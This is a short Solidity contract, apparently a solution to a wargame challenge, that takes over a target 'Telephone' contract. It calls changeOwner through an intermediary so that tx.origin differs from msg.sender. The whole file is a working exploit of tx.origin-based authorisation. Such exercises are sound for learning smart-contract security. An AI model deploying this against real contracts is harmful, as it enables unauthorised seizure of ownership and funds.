// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}
contract TelephoneAttack {
  ITelephone public telephoneAddress;

  constructor(address _telephoneAddress) {
    telephoneAddress = ITelephone(_telephoneAddress);
  }

  function changeOwner() external {
    telephoneAddress.changeOwner(msg.sender);
  }
}